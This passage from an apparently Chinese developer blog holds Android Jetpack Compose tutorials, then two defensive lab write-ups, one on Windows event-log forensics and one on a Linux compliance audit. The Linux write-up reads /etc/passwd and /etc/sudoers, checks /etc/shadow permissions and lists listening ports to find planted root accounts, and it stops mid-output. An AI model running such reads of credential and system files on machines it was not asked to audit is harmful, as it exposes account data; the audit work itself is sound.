Arrangement.spacedBy(16.dp)\r) {\ritems(favoriteCollectionsData){\ritem-\u0026gt; FavoriteCollectionCard(drawable = item.drawable, text = item.text, modifier = Modifier.height(80.dp))\r}\r}\r} LazyHorizontalGrid同样是懒加载的组件，指定了行数row之后会自动排列，然后使用items进行子元素生成\n内容插槽 #\r@Composable\rfun HomeSection(\r@StringRes title: Int,\rmodifier: Modifier = Modifier,\rcontent: @Composable () -\u0026gt; Unit\r) {\rColumn(modifier=modifier) {\rText(\rtext = stringResource(title),\rstyle = MaterialTheme.typography.titleMedium,\rmodifier = Modifier\r.paddingFromBaseline(top = 40.dp, bottom = 16.dp)\r.padding(horizontal = 16.dp),\r)\rcontent()\r}\r} 将内容传入HomeSection插槽来使用，增强代码的结构性。具体如下，并且要使用verticalScroll添加可滑动效果\n//主体代码\r@Composable\rfun HomeScreen(modifier: Modifier = Modifier) {\rColumn(\rmodifier= modifier\r.fillMaxHeight()\r.background(color = Color(0xFFdbccb9))\r.verticalScroll(\rrememberScrollState()\r)\r.padding(bottom = 20.dp)\r) {\rSpacer(modifier = Modifier.height(16.dp))\rSearchBar(Modifier.padding(horizontal = 16.dp))\rHomeSection(title = R.string.username) {\rAlignYourBodyRow()\r}\rHomeSection(title = R.string.username) {\rFavoriteCollectionsGrid()\r}\r}\r} 导航栏 #\r由于涉及到横屏和竖屏两种情况，导航栏得做两个\n//竖屏 NavigationBar( modifier = modifier, ){ NavigationBarItem( icon = { Icon( imageVector = Icons.Default.Home, contentDescription = stringResource(id = R.string.username) ) }, label = { Text( text = stringResource(id = R.string.home) ) }, selected = true, onClick = {} ) NavigationBarItem( icon = { Icon( imageVector = Icons.Default.AccountCircle, contentDescription = null ) }, label = { Text( text = stringResource(id = R.string.profile) ) }, selected = false, onClick = {} ) } Jetpack Compose十分贴心，内置了底部导航栏的组件，可以直接使用。\n//横屏 @Composable private fun SootheNavigationRail(modifier: Modifier=Modifier) { NavigationRail( modifier=modifier.padding(top = 8.dp, bottom = 8.dp), containerColor = MaterialTheme.colorScheme.background, ) { Column( modifier=modifier.fillMaxHeight(), verticalArrangement = Arrangement.Center, horizontalAlignment = Alignment.CenterHorizontally ) { NavigationRailItem(selected = false, onClick = { /*TODO*/ }, icon = { Icon(imageVector = Icons.Default.Home, contentDescription = null ) }, label = { Text(text = stringResource(id = R.string.home)) }, ) Spacer(modifier = Modifier.height(8.dp)) NavigationRailItem(selected = false, onClick = { /*TODO*/ }, icon = { Icon(imageVector = Icons.Default.AccountCircle, contentDescription = null) }, label = { Text(text = stringResource(id = R.string.profile)) } ) } } } 判断设备状态 #\r官方的引用方式：窗口大小类别 | Jetpack Compose | Android Developers (google.cn)\n@OptIn(ExperimentalMaterial3AdaptiveApi::class) @Composable fun MyApp( windowSizeClass: WindowSizeClass = currentWindowAdaptiveInfo().windowSizeClass ) { // Perform logic on the size class to decide whether to show the top app bar. val showTopAppBar = windowSizeClass.windowHeightSizeClass != WindowHeightSizeClass.COMPACT // MyScreen knows nothing about window sizes, and performs logic based on a Boolean flag. MyScreen( showTopAppBar = showTopAppBar, /* ... */ ) } 随意选择即可，我这里使用的是高度判断，并且只关心了手机设备\n@Composable fun MyApp( windowSizeClass: WindowSizeClass = currentWindowAdaptiveInfo().windowSizeClass ) { // Perform logic on the size class to decide whether to show the top app bar. when(windowSizeClass.windowHeightSizeClass) { WindowHeightSizeClass.MEDIUM,WindowHeightSizeClass.EXPANDED-\u0026gt;{ Scaffold( bottomBar = { SootheBottomNavigation() } ) { padding -\u0026gt; HomeScreen(Modifier.padding(padding)) } } WindowHeightSizeClass.COMPACT-\u0026gt;{ Row { SootheNavigationRail() HomeScreen() } } } } 如果是常规的竖屏情况下，可以使用Scaffold组件来进行快速创建包含各种导航栏的界面。\n在横屏状态下，导航栏和主体内容应该是成横向排列的\n总体代码 #\rclass MainActivity : ComponentActivity() { override fun onCreate(savedInstanceState: Bundle?) { super.onCreate(savedInstanceState) enableEdgeToEdge() setContent { MyApplicationTheme { MyApp() } } } } data class AlignYourBodyData( @DrawableRes val drawable:Int, @StringRes val text:Int ) data class FavoriteCollectionsData( @DrawableRes val drawable: Int, @StringRes val text: Int ) @Composable fun FavoriteCollectionsGrid(modifier: Modifier=Modifier) { val favoriteCollectionsData= listOf( FavoriteCollectionsData(R.drawable.tomcat,R.string.username), FavoriteCollectionsData(R.drawable.tomcat,R.string.username), FavoriteCollectionsData(R.drawable.tomcat,R.string.username), FavoriteCollectionsData(R.drawable.tomcat,R.string.username), FavoriteCollectionsData(R.drawable.tomcat,R.string.username), FavoriteCollectionsData(R.drawable.tomcat,R.string.username), ) LazyHorizontalGrid( rows = GridCells.Fixed(2), modifier=modifier.height(168.dp), contentPadding = PaddingValues(horizontal = 16.dp), horizontalArrangement = Arrangement.spacedBy(16.dp), verticalArrangement = Arrangement.spacedBy(16.dp) ) { items(favoriteCollectionsData){ item-\u0026gt; FavoriteCollectionCard(drawable = item.drawable, text = item.text, modifier = Modifier.height(80.dp)) } } } @Composable fun AlignYourBodyRow(modifier: Modifier=Modifier) { val alignYourBodyData= listOf( AlignYourBodyData(R.drawable.tomcat,R.string.username), AlignYourBodyData(R.drawable.tomcat,R.string.username), AlignYourBodyData(R.drawable.tomcat,R.string.username), AlignYourBodyData(R.drawable.tomcat,R.string.username), AlignYourBodyData(R.drawable.tomcat,R.string.username), ) LazyRow( modifier=modifier, horizontalArrangement = Arrangement.spacedBy(8.dp), contentPadding = PaddingValues(horizontal = 16.dp) ){ items(alignYourBodyData){ item-\u0026gt; AlignYourBodyElement(drawable = item.drawable, text = item.text) } } } @Composable fun AlignYourBodyElement( modifier: Modifier=Modifier, @DrawableRes drawable:Int, @StringRes text:Int ) { Column( horizontalAlignment = Alignment.CenterHorizontally, modifier = modifier ) { Image(painter = painterResource(id = drawable), contentDescription =null , modifier= Modifier .size(88.dp) .clip(CircleShape), contentScale = ContentScale.Crop ) Text(text = stringResource(id = text), modifier=Modifier.paddingFromBaseline(top = 24.dp, bottom = 8.dp) ) } } @Composable fun SearchBar(modifier: Modifier=Modifier) { TextField(value = \u0026#34;\u0026#34;, onValueChange = {}, modifier= modifier .fillMaxWidth() .heightIn(min = 56.dp), leadingIcon = { Icon(painter = painterResource(id = R.drawable.search), contentDescription = null ) }, colors = TextFieldDefaults.colors( unfocusedLabelColor = MaterialTheme.colorScheme.surface, focusedContainerColor = MaterialTheme.colorScheme.surface, ), placeholder = { Text(text = stringResource(R.string.search)) } ) } @Composable fun FavoriteCollectionCard( modifier: Modifier=Modifier, @DrawableRes drawable: Int, @StringRes text:Int ) { Surface( shape = MaterialTheme.shapes.medium, modifier = modifier, color = MaterialTheme.colorScheme.surfaceVariant ) { Row ( verticalAlignment = Alignment.CenterVertically, modifier=modifier.width(255.dp) ){ Image(painter = painterResource(id = drawable), contentDescription =null, modifier=Modifier.size(80.dp), contentScale = ContentScale.Crop ) Text(text = stringResource(id = text)) } } } @Composable fun HomeSection( @StringRes title: Int, modifier: Modifier = Modifier, content: @Composable () -\u0026gt; Unit ) { Column(modifier=modifier) { Text( text = stringResource(title), style = MaterialTheme.typography.titleMedium, modifier = Modifier .paddingFromBaseline(top = 40.dp, bottom = 16.dp) .padding(horizontal = 16.dp), ) content() } } @Composable fun HomeScreen(modifier: Modifier = Modifier) { Column( modifier= modifier .fillMaxHeight() .background(color = Color(0xFFdbccb9)) .verticalScroll( rememberScrollState() ) .padding(bottom = 20.dp) ) { Spacer(modifier = Modifier.height(16.dp)) SearchBar(Modifier.padding(horizontal = 16.dp)) HomeSection(title = R.string.username) { AlignYourBodyRow() } HomeSection(title = R.string.username) { FavoriteCollectionsGrid() } } } @Composable private fun SootheBottomNavigation(modifier: Modifier=Modifier){ NavigationBar( modifier = modifier, ){ NavigationBarItem( icon = { Icon( imageVector = Icons.Default.Home, contentDescription = stringResource(id = R.string.username) ) }, label = { Text( text = stringResource(id = R.string.home) ) }, selected = true, onClick = {} ) NavigationBarItem( icon = { Icon( imageVector = Icons.Default.AccountCircle, contentDescription = null ) }, label = { Text( text = stringResource(id = R.string.profile) ) }, selected = false, onClick = {} ) } } @Composable private fun SootheNavigationRail(modifier: Modifier=Modifier) { NavigationRail( modifier=modifier.padding(top = 8.dp, bottom = 8.dp), containerColor = MaterialTheme.colorScheme.background, ) { Column( modifier=modifier.fillMaxHeight(), verticalArrangement = Arrangement.Center, horizontalAlignment = Alignment.CenterHorizontally ) { NavigationRailItem(selected = false, onClick = { /*TODO*/ }, icon = { Icon(imageVector = Icons.Default.Home, contentDescription = null ) }, label = { Text(text = stringResource(id = R.string.home)) }, ) Spacer(modifier = Modifier.height(8.dp)) NavigationRailItem(selected = false, onClick = { /*TODO*/ }, icon = { Icon(imageVector = Icons.Default.AccountCircle, contentDescription = null) }, label = { Text(text = stringResource(id = R.string.profile)) } ) } } } @Composable fun MyApp( windowSizeClass: WindowSizeClass = currentWindowAdaptiveInfo().windowSizeClass ) { when(windowSizeClass.windowHeightSizeClass) { WindowHeightSizeClass.MEDIUM,WindowHeightSizeClass.EXPANDED-\u0026gt;{ Scaffold( bottomBar = { SootheBottomNavigation() } ) { padding -\u0026gt; HomeScreen(Modifier.padding(padding)) } } WindowHeightSizeClass.COMPACT-\u0026gt;{ Row { SootheNavigationRail() HomeScreen() } } } } @Preview(showBackground = true) @Composable fun MyPreview() { MyApplicationTheme { MyApp() } } ","date":"2024-07-12","externalUrl":null,"permalink":"/posts/2024/07/basic-layouts-in-android-compose/","section":"Posts","summary":"","title":"Android-Compose中的基本布局","type":"posts"},{"content":"","date":"2024-07-12","externalUrl":null,"permalink":"/tags/app/","section":"Tags","summary":"","title":"App","type":"tags"},{"content":"","date":"2024-07-12","externalUrl":null,"permalink":"/categories/web-develop/","section":"Categories","summary":"","title":"Web-Develop","type":"categories"},{"content":"\r前言 #\r在上一篇摇骰子的文章里，在局部使用了remember multableStateof用于将变量存于内存之中，以便于状态变换。这篇文章的主要内容是设计一个简单的小费计算器，并且可以自定义选项。\n视图结构 #\r整体来说是一个Column柱形结构，在中间给出向上取整的选项，根据Bill Amount和Percentage的实时变化，下面的Tip Amount也会跟着变\n解决方案 #\r要实现Tip Amout的实时更新，那么就需要把变量设置为最顶级域，并且传入内存\n@Composable\rfun TipTimeLayout(modifier: Modifier=Modifier)\r{\rvar roundUp by remember { mutableStateOf(false) }\rvar amountInput by remember { mutableStateOf(\u0026#34;\u0026#34;) }\rvar tipInput by remember { mutableStateOf(\u0026#34;\u0026#34;) }\r} 对原始的TextField进行重新封装，这里的onValueChange是一个lambda表达式，指的是接受一个字符串，后面会将其传给Value显示\n@Composable\rfun EditNumberField(value:String,\ronValueChange:(String)-\u0026gt;Unit,\rmodifier: Modifier = Modifier,\rid:Int,\rkeyboardOptions: KeyboardOptions,\r) {\rTextField(\rvalue = value,\ronValueChange = onValueChange,\rmodifier = modifier,\rlabel = { Text(text = stringResource(id = id))},\rkeyboardOptions = keyboardOptions\r)\r} Tip计算函数会根据传入的routUp布尔值进行选择性向上取整\nprivate fun calculateTip(amount: Double, tipPercent: Double=15.0,roundUp: Boolean):String{\rvar tip = tipPercent / 100 * amount\rif (roundUp) {\rtip = kotlin.math.ceil(tip)\r}\rreturn NumberFormat.getCurrencyInstance().format(tip)\r} Keyboard监听事件，是TextField的一个属性，指的是选择文本域后执行的键盘事件，比如下面选择文本域后，会弹出数字键盘，并且点击右下角的Enter（或者←）会跳到下一个文本域。\nkeyboardOptions = KeyboardOptions.Default.copy(\rkeyboardType = KeyboardType.Number,\rimeAction = ImeAction.Next\r) 横屏适配，也是Modifier中的一个属性：verticalScroll（垂直滚动），如果不加上这个属性，在横屏的情况下Tip Amount会由于屏幕限制无法显示，如果加上滑动效果会更好些。\n.... Column(modifier= modifier\r.statusBarsPadding()\r.fillMaxSize()\r.padding(horizontal = 40.dp)\r.verticalScroll(\rrememberScrollState()\r)\r.safeContentPadding(),\rhorizontalAlignment = Alignment.CenterHorizontally,\rverticalArrangement = Arrangement.Center) 整体代码 #\rimport...\rclass MainActivity : ComponentActivity() {\roverride fun onCreate(savedInstanceState: Bundle?) {\rsuper.onCreate(savedInstanceState)\renableEdgeToEdge()\rsetContent {\rMyApplicationTheme {\rSurface(modifier = Modifier\r.fillMaxSize(),\rcolor = MaterialTheme.colorScheme.background) {\rTipTimeLayout()\r}\r}\r}\r}\r}\r@Composable\rfun TipTimeLayout(modifier: Modifier=Modifier)\r{\rvar roundUp by remember { mutableStateOf(false) }\rvar amountInput by remember { mutableStateOf(\u0026#34;\u0026#34;) }\rvar tipInput by remember { mutableStateOf(\u0026#34;\u0026#34;) }\rval amount = amountInput.toDoubleOrNull()?:0.0\rval percent = tipInput.toDoubleOrNull()?:0.0\rval tip = calculateTip(amount, tipPercent = percent,roundUp)\rColumn(modifier= modifier\r.statusBarsPadding()\r.fillMaxSize()\r.padding(horizontal = 40.dp)\r.verticalScroll(\rrememberScrollState()\r)\r.safeContentPadding(),\rhorizontalAlignment = Alignment.CenterHorizontally,\rverticalArrangement = Arrangement.Center) {\rText(text = stringResource(id = R.string.calculate_tip),\rmodifier= Modifier\r.align(Alignment.Start)\r.padding(bottom = 16.dp, top = 40.dp)\r)\rEditNumberField(value = amountInput,\ronValueChange = { amountInput = it },\rmodifier= Modifier\r.padding(bottom = 32.dp)\r.fillMaxSize(),\rid = R.string.bill_amount,\rkeyboardOptions = KeyboardOptions.Default.copy(\rkeyboardType = KeyboardType.Number,\rimeAction = ImeAction.Next\r))\rEditNumberField(value = tipInput,\ronValueChange = { tipInput = it },\rmodifier= Modifier\r.padding(bottom = 32.dp)\r.fillMaxSize(),\rid = R.string.how_was_the_service,\rkeyboardOptions = KeyboardOptions.Default.copy(\rkeyboardType = KeyboardType.Number,\rimeAction = ImeAction.Done\r),\r)\rRoundTheTipRow( roundUp = roundUp,\ronRoundUpChanged = { roundUp = it },\rmodifier = Modifier.padding(bottom = 32.dp),\r)\rText(text = stringResource(id = R.string.tip_amount,tip),\rfontSize = MaterialTheme.typography.headlineMedium.fontSize, )\rSpacer(modifier = Modifier.height(150.dp))\r}\r}\r@Composable\rfun RoundTheTipRow(roundUp: Boolean,\ronRoundUpChanged: (Boolean) -\u0026gt; Unit\r,modifier: Modifier = Modifier,\r) {\rRow(modifier= modifier\r.fillMaxSize()\r.size(48.dp),\rhorizontalArrangement = Arrangement.Center,\rverticalAlignment = Alignment.CenterVertically\r) {\rText(text = stringResource(R.string.round_up_tip),\rmodifier=Modifier.padding(bottom = 20.dp),\r)\rSwitch(\rchecked = roundUp,\ronCheckedChange = onRoundUpChanged,\rmodifier = modifier\r.fillMaxWidth()\r.wrapContentWidth(Alignment.End)\r)\r}\r}\r@Composable\rfun EditNumberField(value:String,\ronValueChange:(String)-\u0026gt;Unit,\rmodifier: Modifier = Modifier,\rid:Int,\rkeyboardOptions: KeyboardOptions,\r) {\rTextField(\rvalue = value,\ronValueChange = onValueChange,\rmodifier = modifier,\rlabel = { Text(text = stringResource(id = id))},\rkeyboardOptions = keyboardOptions\r)\r}\rprivate fun calculateTip(amount: Double, tipPercent: Double=15.0,roundUp: Boolean):String{\rvar tip = tipPercent / 100 * amount\rif (roundUp) {\rtip = kotlin.math.ceil(tip)\r}\rreturn NumberFormat.getCurrencyInstance().format(tip)\r} ","date":"2024-07-10","externalUrl":null,"permalink":"/posts/2024/07/android-state-interaction-tip-calculate/","section":"Posts","summary":"","title":"Android-状态交互-TipCalculate","type":"posts"},{"content":"\r前言 #\r最近在学习Android app开发，用的是Kotlin语言，然而B站上面的视频质量并不是很高，大多数都是对编程无基础人员的基本语法教学。相比之下，我觉得Android官方的Developer开发者课程是很不错的。此文章就是根据Android Developer中的创建交互式Dice Roller（摇骰子）部分进行学习记录，使用的是Jetpack compose的ui开发框架。\n环境 #\rAPI版本：31（官方使用的是26，不过并没有什么影响）\n关键点 #\rModifier #\r在Jetpack Compose框架中，每一个可组合函数都会有个自带的Modifier，用于修改其样式。具体来说就类似于html中的div容器，在此框架中每个函数都会自带一个容器，容器也是可以继承的，也就是说子对象可以使用父对象的容器特征。\n例如在下面这个代码示例中，整体视窗大小是被指定为Modifier的fillMaxSize，也就是填充到最大尺寸（填充全屏）。不仅如此还可指定padding填充、背景颜色、以及填充权重等。。。\nclass MainActivity : ComponentActivity() {\roverride fun onCreate(savedInstanceState: Bundle?) {\rsuper.onCreate(savedInstanceState)\renableEdgeToEdge()\rsetContent {\rMyApplicationTheme {\rSurface(modifier = Modifier\r.fillMaxSize(),\rcolor = MaterialTheme.colorScheme.background) {\rDiceWithButtonAndImage(modifier = Modifier\r.fillMaxSize())\r}\r}\r}\r}\r} Compose #\r在函数上方添加**@Compose注解，可以将函数声明为可组合**函数。声明后，就有点类似于html的盒子模型，可以进行组合嵌套。\n@Composable\rfun DiceWithButtonAndImage(modifier: Modifier) {\rColumn(modifier=modifier,\rhorizontalAlignment = Alignment.CenterHorizontally,\rverticalArrangement = Arrangement.Center) {\rImage(\rpainter = painterResource(R.drawable.dic1),\rcontentDescription = result.toString()\r)\rButton(onClick = {\r}) {\rText(stringResource(R.string.roll),\rmodifier=Modifier.height(16.dp))\r}\r}\r} 在上面这段代码中，可以看到整体是一个column竖柱形的**“容器”，其中放置了一个图片和一个按钮。对于排列函数来说，可以指定其水平或垂直的Style**\n解决方案 #\r逻辑梳理 #\r在未点击按钮之前，应该先展示一张骰子的图片（可以随机也可以固定），这里就用固定的方式来展示。\n那么在Button点击之后，希望得到的效果就是，界面上的Image被替换。\n但是如果直接使用变量覆盖的方式是无法实现的，因为在Button点击之前页面是已经加载好了的，点击后再修改Image的source是没有效果的。\n基于内存管理 #\r默认情况下，可组合函数是无状态的，这意味着它们不存储值，并且可随时被系统重组，从而导致值被重置。不过，Compose 提供了一种避免这种情况的便捷方式。可组合函数可以使用 remember 可组合函数将对象存储在内存中。\n那么将骰子的值使用remember进行内存存储就行了\n代码 #\rimport....\rclass MainActivity : ComponentActivity() {\roverride fun onCreate(savedInstanceState: Bundle?) {\rsuper.onCreate(savedInstanceState)\renableEdgeToEdge()\rsetContent {\rMyApplicationTheme {\rSurface(modifier = Modifier\r.fillMaxSize(),\rcolor = MaterialTheme.colorScheme.background) {\rDiceWithButtonAndImage(modifier = Modifier\r.fillMaxSize())\r}\r}\r}\r}\r}\r@Composable\rfun DiceWithButtonAndImage(modifier: Modifier) {\rColumn(modifier=modifier,\rhorizontalAlignment = Alignment.CenterHorizontally,\rverticalArrangement = Arrangement.Center) {\rvar result by remember { mutableStateOf(1) }\rval imageResource = when (result) {\r1 -\u0026gt; R.drawable.dice_1\r2 -\u0026gt; R.drawable.dice_2\r3 -\u0026gt; R.drawable.dice_3\r4 -\u0026gt; R.drawable.dice_4\r5 -\u0026gt; R.drawable.dice_5\relse -\u0026gt; R.drawable.dice_6\r}\rImage(\rpainter = painterResource(imageResource),\rcontentDescription = result.toString()\r)\rButton(onClick = {\rresult = (1..6).random()\rLog.i(\u0026#34;HYH\u0026#34;, result.toString())\r}) {\rText(stringResource(R.string.roll),\rmodifier=Modifier.height(16.dp))\r}\r}\r} 界面效果\n","date":"2024-07-09","externalUrl":null,"permalink":"/posts/2024/07/dice-shaker-development-in-android-compose/","section":"Posts","summary":"","title":"Android-Compose初步-摇骰子","type":"posts"},{"content":"","date":"2024-07-08","externalUrl":null,"permalink":"/categories/web-security/","section":"Categories","summary":"","title":"Web-Security","type":"categories"},{"content":"\r关于evtx #\revtx文件是微软采用的一种全新的日志文件格式。在此之前的格式是 evt 。evtx由Windows事件查看器创建，包含Windows记录的事件列表，以专有的二进制XML格式保存。\n在本文的附件中，存在三个日志，分别是安全、日志、应用程序\n不要直接运行！！用windows自带的事件查看器打开\n开始分析 #\r#步骤1（安全日志 #\r1.将黑客成功登录系统所使用的IP地址\n查找与登录相关的事件ID，如 4624 (成功登录)、4625 (登录失败)。\n查看详细信息得到黑客IP\n#步骤2（安全日志 #\r2.黑客成功登录系统后修改了登录用户的用户名\n查询事件为ID 4738（修改用户属性）\n可以看到原本的administrator被修改成了Administartro。\n那么修改后的用户名就是Administartro\n#步骤三（安全日志 #\r3.黑客成功登录系统后成功访问了一个关键位置的文件\n查询事件ID 4663（对象访问）\n访问文件名为SCHEMA.DAT，似乎是一个数据库文件。。。\n#步骤四（应用程序日志 #\r4.黑客成功登录系统后重启过几次数据库服务，最后一次重启数据库服务后数据库服务的进程ID号\n设置筛选器为MySQL\n随便查看一个发现有starting的字符串存在\n按照时间倒序，查找starting字符串，在最近的一段发现ID是1052，不过这并不是答案，因为说的是重启，那么一定要有人为的normal shutdown日志才对\n正确的进程是ID 8820\n之前的人为关闭\n#步骤五（系统日志 #\r5.黑客成功登录系统后修改了登录用户的用户名并对系统执行了多次重启操作，黑客使用修改后的用户重启系统的次数\n查询事件ID为 1074 （系统计划启动）\n虽然有六条日志，但是从详细信息和时间来看，实际上是两两分组的，重启的次数一共有三次\n","date":"2024-07-08","externalUrl":null,"permalink":"/posts/2024/07/windows-evtx-analysis/","section":"Posts","summary":"","title":"Windows-evtx分析","type":"posts"},{"content":"\r前言 #\r环境来自于玄机edisec\n题解 #\r步骤一 #\r1.查看相应文件，账户xiaoming的密码设定多久过期\nlinux chage命令简介：chage命令用于密码实效管理，该是用来修改帐号和密码的有效期限。\nchage -l xiaoming #执行会得到以下内容\rLast password change : \u0026lt;上次密码更改的日期\u0026gt;\rPassword expires : \u0026lt;密码过期日期\u0026gt;\rPassword inactive : \u0026lt;密码失效日期\u0026gt;\rAccount expires : \u0026lt;账户失效日期\u0026gt;\rMinimum number of days between password change : \u0026lt;密码更改的最小天数\u0026gt;\rMaximum number of days between password change : \u0026lt;密码更改的最大天数\u0026gt;\rNumber of days of warning before password expires : \u0026lt;密码过期警告天数\u0026gt; 那么我这里得到的信息呢就是\nroot@dengbap:~# chage -l xiaoming\rLast password change : password must be changed\rPassword expires : password must be changed\rPassword inactive : password must be changed\rAccount expires : never\rMinimum number of days between password change : 0\rMaximum number of days between password change : 7\rNumber of days of warning before password expires : 7 这里没有修改过密码，不过可以看出密码的有效期限也就是7天\n答案：flag{7}\n步骤二 #\r2.查看相应文件，设置的密码到期规则是多少按照flag{提醒时间-最大时间}进行提交\ncat /etc/login.defs #可以在Password aging controls中查看并配置用户的密码过期规则 答案：flag{7-99999}\n步骤三 #\r3.已安装ssh，请提交当前SSH版本\nroot@dengbap:/www# ssh -V\rOpenSSH_8.9p1 Ubuntu-3ubuntu0.7, OpenSSL 3.0.2 15 Mar 2022 答案：flag{OpenSSH_8.9p1}\n步骤四 #\r4.对passwd及shadow文件权限分配进行权限值提交并提交是否合规如：644+true\nroot@dengbap:/# ls -l /etc/passwd /etc/shadow\r-rwxr-xr-x 1 root root 2304 Jun 25 16:19 /etc/passwd\r-rwxr-xr-x 1 root shadow 1770 Jul 6 20:03 /etc/shadow\r#-rwxr-xr-x用数字表示为755 这两个文件的权限值不合规\n答案：flag{755+false}\n步骤五 #\r5.结合相关知识检查在系统中存在可疑用户，进行提交用户名,多个用户名以+号连接\n此处应急响应的时候也可以用到，主要查看在用户家目录，root家目录，以及passwd和shadow文件的可疑用户和字段\ncat /etc/passwd #查看账号信息\rroot:x:0:0:root:/root:/bin/bash\rdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\rbin:x:2:2:bin:/bin:/usr/sbin/nologin\rsys:x:3:3:sys:/dev:/usr/sbin/nologin\rsync:x:4:65534:sync:/bin:/bin/sync\rgames:x:5:60:games:/usr/games:/usr/sbin/nologin\rman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\rlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\rmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\rnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\ruucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\rproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\rwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\rbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\rlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\rirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\rgnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\rnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\r_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\rsystemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\rsystemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\rmessagebus:x:103:104::/nonexistent:/usr/sbin/nologin\rsystemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\rpollinate:x:105:1::/var/cache/pollinate:/bin/false\rsshd:x:106:65534::/run/sshd:/usr/sbin/nologin\rsyslog:x:107:113::/home/syslog:/usr/sbin/nologin\ruuidd:x:108:114::/run/uuidd:/usr/sbin/nologin\rtcpdump:x:109:115::/nonexistent:/usr/sbin/nologin\rtss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false\rlandscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin\rfwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin\rusbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\rdengbao:x:1000:1000:dengbao:/home/dengbao:/bin/bash\rlxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false\rxiaoming:x:1001:1001::/home/xiaoming:/bin/sh\ryunwei:x:0:1002::/home/yunwei:/bin/sh\rsecurity:x:1002:1003::/home/security:/bin/sh\rzhanglei:x:1003:1004::/home/zhanglei:/bin/sh\rwangwei:x:0:1005::/home/wangwei:/bin/sh\rzhangsan:x:1004:1006::/home/zhangsan:/bin/sh\rmysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false\rredis:x:115:121::/var/lib/redis:/usr/sbin/nologin\rwww:x:1005:1007::/home/www:/sbin/nologin\rdnsmasq:x:116:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin 逐个尝试，发现在yunwei和wangwei两个用户中的权限是root，属于可疑用户\n答案：flag{yunwei+wangwei}\n步骤六 #\r6.结合相关知识，对没有进行权限分离的用户进行提交\nroot@dengbap:/# cat /etc/sudoers\r..................\r..................\r# User privilege specification\rroot ALL=(ALL:ALL) ALL\rzhangsan ALL=(ALL:ALL) ALL\r# Members of the admin group may gain root privileges\r%admin ALL=(ALL) ALL\r# Allow members of group sudo to execute any command\r%sudo ALL=(ALL:ALL) ALL\r# See sudoers(5) for more information on \u0026#34;@include\u0026#34; directives:\r@includedir /etc/sudoers.d 可以看到User privilege那里多了一个zhangsan\nsudo命令的工作过程\n1、当用户执行sudo时，系统会主动寻找/etc/sudoers文件，判断该用户是否有执行sudo的权限；\n2、确认用户具有可执行sudo的权限后，让用户输入用户自己的密码确认；\n3、若密码输入成功，则开始执行sudo后续的命令；\n4、root执行sudo时不需要输入密码(文件中有配置root ALL=(ALL) ALL这样一条规则)；\n5、若欲切换的身份与执行者的身份相同，也不需要输入密码。\n参考文章：ubuntu给用户赋予root权限,并且免密sudo su_root all=(all:all) all-CSDN博客\n答案：flag{zhangsan}\n步骤七 #\r7.结合相关知识，提交审计日志功能状态\n对日志开启状态进行提交：systemctl status syslog\n答案：flag{active}\n步骤八\n8.审计相关日志，查看zhangsan用户尝试使用sudo但登录失败的日志，提交其时间，如flag{Jun 23 00:39:52}\n日志文件的位置是 /var/log/auth.log\nroot@dengbap:~# cat /var/log/auth.log |grep \u0026#34;zhangsan\u0026#34;\rJul 6 20:24:24 dengbap su: (to zhangsan) root on pts/0\rJul 6 20:24:24 dengbap su: pam_unix(su:session): session opened for user zhangsan(uid=1004) by root(uid=0)\rJul 6 20:24:29 dengbap su: pam_unix(su:session): session closed for user zhangsan 答案：flag{Jun 23 01:38:20} #可能是环境不对，我这里没有\n步骤九\n9.结合相关合规知识，提交相关系统内核版本\nroot@dengbap:/# uname -r\r5.15.0-112-generic 答案：flag{5.15.0-112-generic}\n步骤十\n10.对开启的端口排查，结合应急响应知识，对开放的相关恶意端口进行提交\nroot@dengbap:/# netstat -tuln\rActive Internet connections (only servers)\rProto Recv-Q Send-Q Local Address Foreign Address State\rtcp 0 0 0.0.0.0:5566 0.0.0.0:* LISTEN\rtcp 0 0 127.0.0.1:6379 0.0.0.0:* LISTEN\rtcp 0 0 127.0.0.1:41089 0.0.0.0:* LISTEN\rtcp 0 0 127.0.0.1:17221 0.0.0.0:* LISTEN\rtcp 0 0 0.0.0.0:8090 0.0.0.0:* LISTEN\rtcp 0 0 127.0.0.1:17380 0.0.0.0:* LISTEN\rtcp 0 0 127.0.0.1:15329 0.0.0.0:* LISTEN\rtcp 0 0 127.0.0.1:17400 0.0.0.0:* LISTEN\rtcp 0 0 127.0.0.1:11211 0.0.0.0:* LISTEN\rtcp 0 0 127.0.0.1:17131 0.0.0.0:* LISTEN\rtcp 0 0 127.0.0.1:17033 0.0.0.0:* LISTEN\rtcp 0 0 127.0.0.1:15640 0.0.0.0:* LISTEN\rtcp 0 0 0.0.0.0:33060 0.0.0.0:* LISTEN\rtcp 0 0 127.0.0.1:5538 0.0.0.0:* LISTEN\rtcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN\rtcp 0 0 127.0.0.1:15445 0.0.0.0:* LISTEN\rtcp 0 0 0.0.0.0:12345 0.0.0.0:* LISTEN\rtcp 0 0 127.0.0.1:15538 0.0.0.0:* LISTEN\rtcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN\rtcp 0 0 0.0.0.0:9080 0.0.0.0:* LISTEN\rtcp 0 0 